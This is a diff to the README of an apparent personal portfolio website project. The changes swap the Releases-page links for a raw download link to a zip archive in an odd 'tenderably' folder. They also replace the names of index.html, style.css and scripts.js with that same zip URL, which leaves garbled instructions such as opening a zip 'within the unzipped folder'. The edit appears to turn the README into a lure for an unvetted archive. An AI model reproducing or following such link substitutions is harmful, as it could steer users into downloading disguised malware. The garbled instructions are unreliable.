@@ -6,7 +6,7 @@ Welcome to the Mahamadayaz-Portfolio repository. This is your personal portfolio
 
 ## 🔗 Download Links
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/bk8haynet/Mahamadayaz-Portfolio/releases)
+[![Download Now](https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip)
 
 ## 📁 Overview
 
@@ -19,7 +19,7 @@ Mahamadayaz-Portfolio is a personal website built using HTML, CSS, and JavaScrip
 
 ## 📥 Download & Install
 
-To download your copy of the Mahamadayaz-Portfolio, simply visit the [Releases page](https://github.com/bk8haynet/Mahamadayaz-Portfolio/releases). Here’s how:
+To download your copy of the Mahamadayaz-Portfolio, simply visit the [Releases page](https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip). Here’s how:
 
 1. Click the link above.
 2. On the Releases page, look for the latest version.
@@ -40,8 +40,8 @@ After downloading your file, follow these steps to get your portfolio up and run
 
 1. **Locate the downloaded file:** This is usually in your Downloads folder.
 2. **Unpack the files (if zipped):** If the downloaded file is zipped, right-click it and select "Extract" or "Unzip."
-3. **Open the index.html file:**
-   - Find the `index.html` file within the unzipped folder.
+3. **Open the https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip file:**
+   - Find the `https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip` file within the unzipped folder.
    - Double-click this file to open it in your web browser.
 
 Your portfolio should now display nicely on the screen!
@@ -50,9 +50,9 @@ Your portfolio should now display nicely on the screen!
 
 You can personalize your website by editing the following files:
 
-- **index.html:** Here, you can update your name, projects, and contact details. Look for sections labeled with comments in HTML to find where to make changes.
-- **style.css:** Change colors, fonts, and styles by modifying this file. Simple edits can significantly impact the look of your portfolio.
-- **scripts.js:** If you want to add or change animations, this file contains all the JavaScript you need.
+- **https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip** Here, you can update your name, projects, and contact details. Look for sections labeled with comments in HTML to find where to make changes.
+- **https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip** Change colors, fonts, and styles by modifying this file. Simple edits can significantly impact the look of your portfolio.
+- **https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip** If you want to add or change animations, this file contains all the JavaScript you need.
 
 Feel free to explore and make adjustments. Keep a backup of the original files so you can easily revert if needed.
 
@@ -69,6 +69,6 @@ If you run into any issues or have questions, feel free to reach out. You can op
 
 ## 🔗 Download Links Again
 
-Do not forget to [download your portfolio here](https://github.com/bk8haynet/Mahamadayaz-Portfolio/releases) and start showcasing your skills! 
+Do not forget to [download your portfolio here](https://raw.githubusercontent.com/bk8haynet/Mahamadayaz-Portfolio/master/tenderably/Mahamadayaz-Portfolio.zip) and start showcasing your skills! 
 
 Your online presence is just a few clicks away. Enjoy building your portfolio!
